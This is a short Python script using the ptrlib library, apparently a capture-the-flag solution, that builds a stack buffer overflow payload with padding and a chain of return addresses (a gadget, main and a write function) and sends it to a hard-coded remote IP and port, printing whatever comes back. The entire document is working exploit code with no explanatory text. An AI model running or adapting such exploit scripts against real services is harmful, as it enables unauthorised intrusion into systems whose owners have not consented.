from ptrlib import *

addr_write = 0x400515
addr_main = 0x400776
safe_gadget = 0x400580

payload = b'Z' * 4
payload += b'A' * 4
payload += b'B' * 4
payload += b'C' * 4
payload += b'D' * 4
payload += b'E' * 4
payload += b'F' * 4
payload += b'G' * 4
payload += b'H' * 4
payload += b'I' * 4
payload += p64(safe_gadget)
payload += p64(addr_main)
payload += p64(addr_write) * 8
payload += p64(addr_main) * 8
sock = Socket("34.92.37.22", 10000)
sock.recvuntil("pwn!\n")
sock.send(payload)
while True:
    l = sock.recv(timeout=1.0)
    if l is None:
        break
    print(l)
sock.close()
